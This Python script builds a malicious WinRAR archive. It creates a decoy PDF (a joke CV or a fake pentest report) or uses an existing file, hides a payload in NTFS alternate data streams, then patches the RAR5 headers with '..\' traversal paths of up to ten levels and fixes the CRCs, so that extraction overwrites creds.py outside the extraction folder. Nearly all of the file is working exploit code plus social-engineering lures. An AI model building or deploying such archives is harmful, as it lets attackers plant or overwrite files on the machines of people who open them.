import os
import sys
import zlib
import struct
import platform
import subprocess
from pathlib import Path
from typing import Tuple, List
from datetime import datetime
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
from reportlab.lib import colors

# Configuration
NUM_DEPTHS = 10  # Number of different traversal depths to create
RELATIVE_DROP_PATH = "..\\creds.py"
PAYLOAD = 'ADMIN_USER = "pepe"\nADMIN_PASS = "pepe1234"\n'
PLACEHOLDER_LEN = 200
OUT_RAR = "PepRaR.rar"

# Function to generate long stream names
def generate_long_stream_names(count, length):
    """Generate long placeholder stream names"""
    return [f"stream_{i:02d}" + "x" * (length - len(f"stream_{i:02d}")) for i in range(count)]

# Generate long stream names
ADS_STREAMS = generate_long_stream_names(NUM_DEPTHS, PLACEHOLDER_LEN)

# Path traversal patterns to use in the RAR header
PATH_TRAVERSALS = [
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "../../../../../../",
    "../../../../../../../",
    "../../../../../../../../",
    "../../../../../../../../../",
    "../../../../../../../../../../"
]

# RAR5 constants
RAR5_SIG = b"Rar!\x1A\x07\x01\x00"
HFL_EXTRA = 0x0001
HFL_DATA = 0x0002



def create_professional_cv(file_type="pdf") -> Path:
    """CV de EL PEPE - by Hefin.net"""
    
    filename = f"El_Pepe_CV_{datetime.now().year}.pdf"
    fake_doc = Path(filename)

    if file_type != "pdf":
        raise ValueError("Currently only PDF output is supported.")
    
    try:
        doc = SimpleDocTemplate(str(fake_doc), pagesize=letter, rightMargin=20, leftMargin=20, topMargin=20, bottomMargin=20)
        styles = getSampleStyleSheet()
        story = []

        title_style = ParagraphStyle(
            'CustomTitle',
            parent=styles['Heading1'],
            fontSize=22,
            spaceAfter=12,
            alignment=1,
            textColor=colors.HexColor("#2E5A88"),
            fontName='Helvetica-Bold'
        )

        section_style = ParagraphStyle(
            'SectionTitle',
            parent=styles['Heading2'],
            fontSize=14,
            spaceAfter=6,
            spaceBefore=12,
            textColor=colors.HexColor("#2E5A88"),
            fontName='Helvetica-Bold',
            underline=True
        )

        normal_style = styles['Normal']

        story.append(Paragraph("El Pepe", title_style))
        story.append(Spacer(1, 0.05*inch))

        contact_data = [
            ["📧", "hefinsita@hefin.net", "📱", "+54 9 1178464746"],
            ["🔗", "linkedin.com/in/hefin.net"],
            ["📍", "Avenida Siempre Vivas 1234"]
        ]
        contact_table = Table(contact_data, colWidths=[0.3*inch, 2.5*inch, 0.3*inch, 2.5*inch])
        contact_table.setStyle(TableStyle([
            ('FONT', (0,0), (-1,-1), 'Helvetica', 10),
            ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
        ]))
        story.append(contact_table)
        story.append(Spacer(1, 0.2*inch))

        story.append(Paragraph("PROFESSIONAL SUMMARY", section_style))
        summary_text = ("Especialista en Ciberseguridad con más de 10 años de experiencia intentando que el Multiverso Hefin no colapse por un chmod 777 mal puesto. Experto en convertir falsos positivos en 'características no documentadas' y en sobrevivir a las auditorías de Hefinsita sin perder la cordura (ni la clave privada).")
        story.append(Paragraph(summary_text, normal_style))
        story.append(Spacer(1, 0.2*inch))

        story.append(Paragraph("TECHNICAL EXPERTISE", section_style))
        skills_data = [
            ['Programming', 'Python (para scripts de 5 minutos que duran 5 años), JavaScript (XSS intensivo), Java (solo bajo tortura), Go (para exploits veloces), C++ (para romper el stack)'],
            ['Frameworks', 'Django (monolitos pesados), Flask (nuestro salvador en el puerto 5000), React (para frontends que ocultan bugs), Node.js (eventos infinitos), TensorFlow (IA para predecir el humor de Hefinsita)'],
            ['Cloud', 'AWS (S3 buckets abiertos por error), Azure (el laberinto de licencias), GCP (la nube donde vive el Multiverso)'],
            ['DevOps', 'Docker (si funciona en mi PC, va al container), Kubernetes (orquestación del caos), Jenkins (el semáforo rojo eterno), Terraform (infraestructura como código... y como problema)'],
            ['Databases', 'MySQL (el clásico inyectable), PostgreSQL (para queries nivel Senior), MongoDB (el cementerio de JSONs), Redis (lo único que evita que el servidor explote)'],
        ]
        skills_table = Table(skills_data, colWidths=[2*inch, 4*inch])
        skills_table.setStyle(TableStyle([
            ('FONT', (0,0), (-1,-1), 'Helvetica', 10),
            ('FONT', (0,0), (0,-1), 'Helvetica-Bold', 10),
            ('BACKGROUND', (0,0), (0,-1), colors.HexColor("#F0F0F0")),
            ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
            ('INNERGRID', (0,0), (-1,-1), 0.5, colors.lightgrey),
            ('BOX', (0,0), (-1,-1), 0.5, colors.lightgrey),
            ('PADDING', (0,0), (-1,-1), 6),
        ]))
        story.append(skills_table)
        story.append(Spacer(1, 0.2*inch))

        story.append(Paragraph("PROFESSIONAL EXPERIENCE", section_style))

        experiences = [
            {
                "role": "Senior Software Engineer",
                "company": "Hefin.net, Buenos Aires, AR",
                "period": "Jan 2018 – Present",
                "bullets": [
                    "Led a team of 10 engineers developing cloud-based enterprise applications.",
                    "Improved system uptime by 35% through optimization and monitoring.",
                    "Designed and deployed scalable microservices using Docker and Kubernetes."
                ]
            },
            {
                "role": "Software Engineer",
                "company": "Skynet, Terminator, NN",
                "period": "Jun 2015 – Dec 2017",
                "bullets": [
                    "Developed web and mobile applications for fintech clients.",
                    "Automated testing and deployment pipelines, improving release speed by 20%.",
                    "Collaborated closely with UX/UI teams to improve user experience."
                ]
            }
        ]

        for exp in experiences:
            story.append(Paragraph(f"{exp['role']} | {exp['company']} | {exp['period']}", normal_style))
            for bullet in exp['bullets']:
                story.append(Paragraph(f"• {bullet}", normal_style))
            story.append(Spacer(1, 0.15*inch))

        story.append(Paragraph("EDUCATION", section_style))
        education_data = [
            ['Degree', 'Institution', 'Year'],
            ['MSc Software Engineering', 'Stanford University', '2013 - 2015'],
            ['BSc Computer Science', 'University of California, Berkeley', '2008 - 2012']
        ]
        education_table = Table(education_data, colWidths=[2.5*inch, 3*inch, 1.5*inch])
        education_table.setStyle(TableStyle([
            ('FONT', (0,0), (-1,0), 'Helvetica-Bold', 11),
            ('FONT', (0,1), (-1,-1), 'Helvetica', 10),
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#2E5A88")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('ALIGN', (0,0), (-1,-1), 'CENTER'),
            ('INNERGRID', (0,0), (-1,-1), 0.5, colors.lightgrey),
            ('BOX', (0,0), (-1,-1), 0.5, colors.lightgrey),
            ('PADDING', (0,0), (-1,-1), 6),
        ]))
        story.append(education_table)
        story.append(Spacer(1, 0.2*inch))

        story.append(Paragraph("CERTIFICATIONS", section_style))
        cert_data = [
            ['AWS Certified Solutions Architect - Professional', '2022'],
            ['Professional Python Developer', '2021'],
            ['Scrum Master Certified (SMC)', '2020']
        ]
        cert_table = Table(cert_data, colWidths=[4*inch, 1.5*inch])
        cert_table.setStyle(TableStyle([
            ('FONT', (0,0), (-1,-1), 'Helvetica', 10),
            ('BACKGROUND', (0,0), (-1,-1), colors.HexColor("#F8F8F8")),
            ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
            ('INNERGRID', (0,0), (-1,-1), 0.5, colors.lightgrey),
            ('BOX', (0,0), (-1,-1), 0.5, colors.lightgrey),
            ('PADDING', (0,0), (-1,-1), 6),
        ]))
        story.append(cert_table)
        story.append(Spacer(1, 0.2*inch))

        doc.build(story)
        print(f"Creacion Exitosa de CV: {fake_doc}")

    except Exception as e:
        print(f"Error Creando PDF: {e}")
    
    return fake_doc

def create_extensive_pentest_report(file_type="pdf") -> Path:
    """Create a highly convincing, extensive fake pentest report for TigerSec Engagements."""
    filename = f"Pentest_Report_{datetime.now().strftime('%Y%m%d')}.pdf"
    fake_doc = Path(filename)
    
    doc = SimpleDocTemplate(
        str(fake_doc),
        pagesize=letter,
        rightMargin=40, leftMargin=40, topMargin=40, bottomMargin=40
    )
    styles = getSampleStyleSheet()
    story = []

    # Custom Styles
    title_style = ParagraphStyle(
        'Title',
        parent=styles['Heading1'],
        fontSize=26,
        leading=28,
        alignment=1,
        textColor=colors.HexColor("#2E5A88"),
        fontName='Helvetica-Bold'
    )
    section_style = ParagraphStyle(
        'Section',
        parent=styles['Heading2'],
        fontSize=14,
        spaceAfter=6,
        spaceBefore=12,
        textColor=colors.HexColor("#2E5A88"),
        fontName='Helvetica-Bold',
        underline=True
    )
    normal_style = styles['Normal']
    small_style = ParagraphStyle('small', parent=styles['Normal'], fontSize=9, leading=12)
    
    # Cover Page
    story.append(Spacer(1, 2*inch))
    story.append(Paragraph("TIGERSEC ENGAGEMENTS", title_style))
    story.append(Spacer(1, 0.2*inch))
    story.append(Paragraph("Professional Penetration Test Report", title_style))
    story.append(Spacer(1, 0.3*inch))
    story.append(Paragraph(f"Report Date: {datetime.now().strftime('%B %d, %Y')}", normal_style))
    story.append(Paragraph("Client: Discord Clone Environment (Fake Data)", normal_style))
    story.append(Spacer(1, 3*inch))
    story.append(Paragraph(
        "CONFIDENTIAL",
        ParagraphStyle('Conf', fontSize=24, alignment=1, textColor=colors.red)
    ))
    story.append(PageBreak())
    
    # Executive Summary
    story.append(Paragraph("EXECUTIVE SUMMARY", section_style))
    summary_text = (
        "This penetration test engagement focused on the client's public web applications, "
        "API endpoints, and associated services. Multiple vulnerabilities were identified "
        "that could allow attackers to compromise user data, execute arbitrary code, "
        "and bypass authentication mechanisms."
    )
    story.append(Paragraph(summary_text, normal_style))
    story.append(Spacer(1, 0.2*inch))
    
    # Scope
    story.append(Paragraph("SCOPE OF TESTING", section_style))
    scope_text = (
        "- Public-facing web applications (discord.gg clone environment)\n"
        "- Authentication mechanisms and session management\n"
        "- Input validation and client-side protections\n"
        "- Logging, monitoring, and reporting functionality\n"
        "- Mobile API endpoints"
    )
    story.append(Paragraph(scope_text, normal_style))
    story.append(Spacer(1, 0.2*inch))
    
    # Findings
    story.append(Paragraph("FINDINGS AND VULNERABILITIES", section_style))
    findings_data = [
        ["ID", "Vulnerability", "Severity", "Target URL", "Description", "Recommendation", "Reference"],
        ["001", "Reflected XSS", "Critical", "https://discord.gg/fakeinvite", 
         "Reflected XSS allows execution of arbitrary JavaScript when search parameter is unsanitized.", 
         "Sanitize all inputs, implement output encoding.", "CVE-2025-0001"],
        ["002", "Stored XSS in Chat", "High", "https://discord.gg/chat", 
         "Malicious scripts stored in message content executed for all users in chat rooms.", 
         "Escape HTML and JS in user input, Content Security Policy.", "CVE-2025-0002"],
        ["003", "IDOR – Messages", "Medium", "https://discord.gg/api/messages", 
         "Unauthorized access to other users' messages by modifying message IDs.", 
         "Implement strict server-side authorization checks.", "CVE-2025-0003"],
        ["004", "Information Disclosure", "Low", "https://discord.gg/login", 
         "Verbose error messages reveal framework versions.", 
         "Remove sensitive details from errors, log securely.", "CVE-2025-0004"],
        ["005", "CSRF – Account Settings", "Medium", "https://discord.gg/settings", 
         "Cross-Site Request Forgery possible on account settings update.", 
         "Implement anti-CSRF tokens and check referrer headers.", "CVE-2025-0005"],
        ["006", "Open Redirect", "Low", "https://discord.gg/redirect", 
         "Open redirect allows phishing via crafted URLs.", 
         "Validate and whitelist redirect targets.", "CVE-2025-0006"]
    ]
    
    # Wrap text in cells
    wrapped_data = []
    for row in findings_data:
        wrapped_row = []
        for i, cell in enumerate(row):
            style = ParagraphStyle('cell', fontSize=9, leading=11)
            wrapped_row.append(Paragraph(cell, style))
        wrapped_data.append(wrapped_row)
    
    col_widths = [0.5*inch, 1.2*inch, 0.8*inch, 1.5*inch, 2.2*inch, 2.2*inch, 0.7*inch]
    findings_table = Table(wrapped_data, colWidths=col_widths, repeatRows=1)
    findings_table.setStyle(TableStyle([
        ('FONT', (0,0), (-1,0), 'Helvetica-Bold', 10),
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#2E5A88")),
        ('TEXTCOLOR', (0,0), (-1,0), colors.white),
        ('VALIGN', (0,0), (-1,-1), 'TOP'),
        ('INNERGRID', (0,0), (-1,-1), 0.5, colors.lightgrey),
        ('BOX', (0,0), (-1,-1), 0.5, colors.lightgrey),
        ('LEFTPADDING', (0,0), (-1,-1), 4),
        ('RIGHTPADDING', (0,0), (-1,-1), 4),
        ('TOPPADDING', (0,0), (-1,-1), 4),
        ('BOTTOMPADDING', (0,0), (-1,-1), 4),
    ]))
    story.append(findings_table)
    story.append(Spacer(1, 0.2*inch))
    
    # Evidence
    story.append(Paragraph("EVIDENCE AND PROOF OF CONCEPT", section_style))
    evidence_text = (
        "Screenshots and request/response snippets demonstrate the vulnerabilities. "
        "All URLs, payloads, and sample outputs are recorded for audit purposes.\n\n"
        "- Reflected XSS payload: <script>alert('XSS')</script>\n"
        "- Stored XSS captured in chat logs\n"
        "- IDOR request with modified message ID returned data of another user"
    )
    story.append(Paragraph(evidence_text, small_style))
    story.append(PageBreak())
    
    # Recommendations
    story.append(Paragraph("RECOMMENDATIONS", section_style))
    rec_text = (
        "1. Sanitize all user inputs and enforce output encoding.\n"
        "2. Implement robust authorization checks on server-side endpoints.\n"
        "3. Deploy Content Security Policy (CSP) to mitigate XSS.\n"
        "4. Use anti-CSRF tokens and check referrer headers.\n"
        "5. Suppress verbose error messages and log securely.\n"
        "6. Conduct regular vulnerability scans and penetration tests."
    )
    story.append(Paragraph(rec_text, normal_style))
    story.append(Spacer(1, 0.2*inch))
    
    # Methodology
    story.append(Paragraph("METHODOLOGY", section_style))
    methodology_text = (
        "- Black-box testing\n"
        "- Automated scanning using Burp Suite, OWASP ZAP\n"
        "- Manual validation of vulnerabilities\n"
        "- Reporting according to CVSS standards and best practices"
    )
    story.append(Paragraph(methodology_text, normal_style))
    story.append(Spacer(1, 0.2*inch))
    
    # Disclaimer
    story.append(Paragraph("DISCLAIMER", section_style))
    disclaimer_text = (
        "This report contains simulated data for educational purposes. "
        "All findings, URLs, payloads, and CVEs are fictional and should not be used maliciously."
    )
    story.append(Paragraph(disclaimer_text, small_style))
    
    doc.build(story)
    print(f"Created extensive pentest report: {fake_doc}")
    return fake_doc

def attach_multiple_ads(decoy: Path, payload: Path, stream_names: List[str]):
    """Attach multiple ADS streams to the same file with different names"""
    for stream_name in stream_names:
        ads_path = f"{decoy}:{stream_name}"
        with open(ads_path, "wb") as f:
            f.write(payload.read_bytes())

def find_rar() -> str:
    """Locate WinRAR executable"""
    candidates = [
        r"C:\Program Files\WinRAR\rar.exe",
        r"C:\Program Files (x86)\WinRAR\rar.exe",
    ]
    for d in os.environ.get("PATH", "").split(os.pathsep):
        if d:
            p = Path(d) / "rar.exe"
            if p.exists():
                return str(p)
    for c in candidates:
        if Path(c).exists():
            return c
    raise FileNotFoundError("rar.exe not found")

def create_base_rar(rar_exe: str, decoy: Path) -> Path:
    """Create base RAR archive with the decoy file"""
    base_rar = Path("base.rar")
    if base_rar.exists():
        base_rar.unlink()
    
    subprocess.run(
        f'"{rar_exe}" a -os "{base_rar}" "{decoy}"',
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=True
    )
    return base_rar

def get_vint(buf: bytes, off: int) -> Tuple[int, int]:
    """Read variable-length integer from buffer"""
    val, shift, i = 0, 0, off
    while i < len(buf):
        b = buf[i]; i += 1
        val |= (b & 0x7F) << shift
        if (b & 0x80) == 0: break
        shift += 7
    return val, i - off

def patch_placeholder_in_header(hdr: bytearray, placeholder_utf8: bytes, target_utf8: bytes) -> int:
    """Replace placeholder with target path in header"""
    needle = b":" + placeholder_utf8
    count, i = 0, 0
    while True:
        j = hdr.find(needle, i)
        if j < 0: break
        start = j + 1
        old_len = len(placeholder_utf8)
        if len(target_utf8) > old_len:
            raise ValueError("Replacement longer than placeholder")
        hdr[start:start+len(target_utf8)] = target_utf8
        if len(target_utf8) < old_len:
            hdr[start+len(target_utf8):start+old_len] = b"\x00" * (old_len - len(target_utf8))
        count += 1
        i = start + old_len
    return count

def rebuild_all_header_crc(buf: bytearray) -> int:
    """Recalculate CRC checksums for all headers"""
    sigpos = buf.find(RAR5_SIG)
    if sigpos < 0: 
        raise RuntimeError("RAR signature missing")
    pos = sigpos + len(RAR5_SIG)
    blocks = 0
    while pos + 4 <= len(buf):
        block_start = pos
        try: 
            header_size, hsz_len = get_vint(buf, block_start + 4)
        except Exception: 
            break
        
        header_start = block_start + 4 + hsz_len
        header_end = header_start + header_size
        if header_end > len(buf): 
            break
        
        region = buf[block_start + 4:header_end]
        crc = zlib.crc32(region) & 0xFFFFFFFF
        struct.pack_into("<I", buf, block_start, crc)
        
        i = header_start
        _htype, n1 = get_vint(buf, i); i += n1
        hflags, n2 = get_vint(buf, i); i += n2
        if (hflags & HFL_EXTRA) != 0:
            _extrasz, n3 = get_vint(buf, i); i += n3
        datasz = 0
        if (hflags & HFL_DATA) != 0:
            datasz, n4 = get_vint(buf, i); i += n4
        pos = header_end + datasz
        blocks += 1
    return blocks

def build_relative_paths() -> List[str]:
    """Generate paths with different traversal depths"""
    paths = []
    for depth in range(1, NUM_DEPTHS + 1):
        paths.append(("..\\" * depth) + RELATIVE_DROP_PATH)
    return paths

def patch_rar(base_rar: Path, stream_names: List[str], relative_paths: List[str]) -> Path:
    """Patch RAR archive with multiple traversal paths"""
    print("Target paths:")
    for path in relative_paths:
        print(f"  - {path}")
    
    data = bytearray(base_rar.read_bytes())
    
    current_file_index = 0
    total_patches = 0
    pos = data.find(RAR5_SIG) + len(RAR5_SIG)
    
    while pos + 4 <= len(data) and current_file_index < len(stream_names):
        block_start = pos
        try: 
            header_size, hsz_len = get_vint(data, block_start + 4)
        except Exception: 
            break
        
        header_start = block_start + 4 + hsz_len
        header_end = header_start + header_size
        if header_end > len(data): 
            break
        
        hdr = bytearray(data[header_start:header_end])
        stream_name_utf8 = stream_names[current_file_index].encode("utf-8")
        target_utf8 = relative_paths[current_file_index].encode("utf-8")
        
        c = patch_placeholder_in_header(hdr, stream_name_utf8, target_utf8)
        if c:
            data[header_start:header_end] = hdr
            total_patches += c
            current_file_index += 1
            print(f"Patched stream {current_file_index} with path: {relative_paths[current_file_index-1]}")
        
        i = header_start
        _htype, n1 = get_vint(data, i); i += n1
        hflags, n2 = get_vint(data, i); i += n2
        if (hflags & HFL_EXTRA) != 0:
            _extrasz, n3 = get_vint(data, i); i += n3
        datasz = 0
        if (hflags & HFL_DATA) != 0:
            datasz, n4 = get_vint(data, i); i += n4
        pos = header_end + datasz
    
    if total_patches < len(stream_names):
        print(f"Warning: Only patched {total_patches} of {len(stream_names)} streams")
    
    rebuild_all_header_crc(data)
    final_rar = Path(OUT_RAR)
    final_rar.write_bytes(data)
    return final_rar

def main():
    
    if platform.system() != "Windows":
        print("Este script está diseñado para ejecutarse solo en Windows..")
        sys.exit(1)

    print("Notes: Utilizar archivo propio, funciona con .txt,.sh,.py,.sql but not PDF, jpeg, png etc")
    print("Seleccionar modo de entrada:")
    print("1. Crear documento falso")
    print("2. Usar archivo existente de esta carpeta")
    choice = input("Elegir opción (1 or 2): ").strip()

    if choice == "1":
        print("\nElige un tipo de documento:")
        print("1. PDF CV documento (.pdf)")
        print("2. PDF PENTEST documento (.pdf)")
        doc_choice = input("Enter choice: ").strip()
        
        if doc_choice == "1":
            print("Creating CV document...")
            fake_doc = create_professional_cv("pdf")
        if doc_choice == "2":
            print("Creando documento de informe de prueba de penetración...")
            fake_doc = create_extensive_pentest_report("pdf")

    elif choice == "2":
        files = [f for f in os.listdir('.') if os.path.isfile(f)]
        if not files:
            print("No se encontraron archivos en la carpeta actual.")
            return
        
        print("\nArchivos en la carpeta actual:")
        for i, f in enumerate(files, 1):
            print(f"{i}. {f}")

        file_choice = input("Ingresa el Numero de la Opcion a Utilizar: ").strip()
        if file_choice.isdigit() and 1 <= int(file_choice) <= len(files):
            fake_doc = Path(files[int(file_choice)-1])
            print(f"Utilizar Archivo Existente: {fake_doc}")
        else:
            print("Opción Invalida.")
            return
    else:
        print("Opcion Invalida, Saliendo.")
        return

    # Create payload file
    payload = Path("payload.bat")
    payload.write_text(PAYLOAD, encoding="utf-8")
    
    print(f"Attaching {len(ADS_STREAMS)} ADS streams to {fake_doc}...")
    attach_multiple_ads(fake_doc, payload, ADS_STREAMS)
    
    print("Buscando WinRAR...")
    rar_exe = find_rar()
    
    print("Creando RAR Base...")
    base_rar = create_base_rar(rar_exe, fake_doc)
    
    print("Generating ruta relativa al deploy")
    relative_paths = build_relative_paths()
    
    print("Parcheando RAR recorrido -1 de nivel")
    try:
        final_rar = patch_rar(base_rar, ADS_STREAMS, relative_paths)
    except Exception as e:
        print(f"El parche falló: {e}")
        print("Mantener el RAR base para la depuración")
        return
    
    base_rar.unlink()
    payload.unlink()
    
    print(f"\nExploit creado: {final_rar}")
    print(f"El Payload se intentara cargarse en Donde se encuentra el sistema de Deploy usando {NUM_DEPTHS} diferentes niveles")
    print("Nota: Recuerda exploit subira un nivel para sobreescribir creds.py ")

if __name__ == "__main__":
    main()